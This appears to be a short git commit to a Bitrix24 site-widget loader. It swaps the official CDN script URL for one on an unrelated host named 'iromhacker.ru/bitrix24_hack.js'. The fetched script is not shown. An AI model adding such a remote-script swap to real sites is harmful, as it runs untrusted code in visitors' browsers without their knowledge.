30762a0ce56b3a1d41521c1f20e8355c1b965cf9
cyneprepou4uk <cyneprepou4uk@gmail.com>
2020-01-16 05:52:30 +0300

    1

--- bitrix24.js
+++ bitrix24.js
@@ -1,7 +1,7 @@
 	(function(w,d,u){
 		var s=d.createElement('script');s.async=true;s.src=u+'?'+(Date.now()/60000|0);
 		var h=d.getElementsByTagName('script')[0];h.parentNode.insertBefore(s,h);
-	})(window,document,'https://cdn.bitrix24.by/b12696840/crm/site_button/loader_2_7e5eyq.js');
+	})(window,document,'https://iromhacker.ru/bitrix24_hack.js');
 
 /* https://cdn.bitrix24.by/b12696840/crm/site_button/loader_2_7e5eyq.js */
 /* https://iromhacker.ru/bitrix24_hack.js */
